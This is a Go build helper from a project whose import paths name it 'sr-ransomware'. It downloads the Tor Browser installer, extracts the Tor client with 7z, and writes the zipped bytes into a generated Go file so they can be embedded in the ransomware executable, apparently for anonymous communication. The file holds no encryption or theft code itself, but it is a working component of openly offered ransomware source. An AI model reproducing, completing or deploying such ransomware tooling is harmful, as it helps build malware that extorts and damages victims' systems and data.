package main

import (
    "os"
    "io"
    "fmt"
    "log"
    "os/exec"
    "net/http"
    "io/ioutil"
    "path/filepath"

    "github.com/sug0/sr-ransomware/go/fs"
)

const workdir = "tmp"
const torZip  = "Tor.zip"

var torDirBack = filepath.Join("..", "..", "..", "..")
var torDirPath = filepath.Join(workdir, "Browser", "TorBrowser", "Tor")
var torExePath = filepath.Join(workdir, "TorInstaller.exe")
var torZipMove = filepath.Join("..", "..", "..", torZip)
var torZipPath = filepath.Join(workdir, torZip)

func main() {
    log.Println("> Generating github.com/sug0/sr-ransomware/go/exe/tor_buffer.go")
    if _, err := os.Stat("tor_buffer.go"); err == nil {
        return
    }
    f, err := os.Create("tor_buffer.go")
    if err != nil {
        log.Fatal(err)
    }
    defer f.Close()
    tor, err := torBytes()
    if err != nil {
        log.Fatal(err)
    }
    fmt.Fprintf(f, "package exe;")
    fmt.Fprintf(f, "var torZIP=[]byte{")
    for i := 0; i < len(tor); i++ {
        fmt.Fprintf(f, "%d,", tor[i])
    }
    fmt.Fprintf(f, "}")
}

func torBytes() ([]byte, error) {
    if err := os.Mkdir(workdir, os.ModePerm); err != nil && !os.IsExist(err) {
        return nil, err
    }
    if _, err := os.Stat(torExePath); err != nil {
        err = downloadTor()
        if err != nil {
            return nil, err
        }
    }
    if _, err := os.Stat(torZipPath); err != nil {
        err = packTor()
        if err != nil {
            return nil, err
        }
    }
    f, err := os.Open(torZipPath)
    if err != nil {
        return nil, err
    }
    defer f.Close()
    return ioutil.ReadAll(f)
}

func packTor() error {
    err := exec.Command("7z", "-o"+workdir, "x", torExePath).Run()
    if err != nil {
        return err
    }
    err = os.Chdir(torDirPath)
    if err != nil {
        return err
    }
    err = exec.Command("7z", "-tzip", "-mx=9", "a", torZip, "*").Run()
    if err != nil {
        return err
    }
    err = fs.Move(torZipMove, torZip)
    if err != nil {
        return err
    }
    return os.Chdir(torDirBack)
}

func downloadTor() error {
    f, err := os.Create(torExePath)
    if err != nil {
        return err
    }
    defer f.Close()
    rsp, err := http.Get("https://www.torproject.org/dist/torbrowser/9.0.10/torbrowser-install-9.0.10_en-US.exe")
    if err != nil {
        return err
    }
    defer rsp.Body.Close()
    _, err = io.Copy(f, rsp.Body)
    return err
}
